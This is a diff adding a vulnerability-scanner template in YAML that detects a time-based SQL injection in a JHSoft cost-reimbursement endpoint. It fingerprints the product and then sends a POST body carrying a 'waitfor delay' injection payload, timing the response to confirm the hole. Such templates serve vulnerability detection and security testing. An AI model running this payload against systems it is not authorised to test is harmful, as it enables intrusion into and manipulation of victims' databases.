@@ -1,0 +1,43 @@
+id: poc-yaml-jinher-jhsoft-costreimbursementhandler-aspx-sqli
+info:
+  name: JHSoft CostReimbursementHandler.ashx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL injection vulnerability in the JHSoft CostReimbursementHandler.ashx endpoint. The issue allows an attacker to inject SQL commands to manipulate the database.
+
+variables:
+  t1: '{{rand_int(5, 10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "JHSoft"
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/c6/JHSoft.Web.CostControl/CostManagement/Reimbursement/CostReimbursementHandler.ashx"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "action=YeahChange&yeah=1'waitfor+delay%270:0:{{t1}}%27--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: dsl
+        dsl:
+          - "!contains(header, 'cookie')"
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
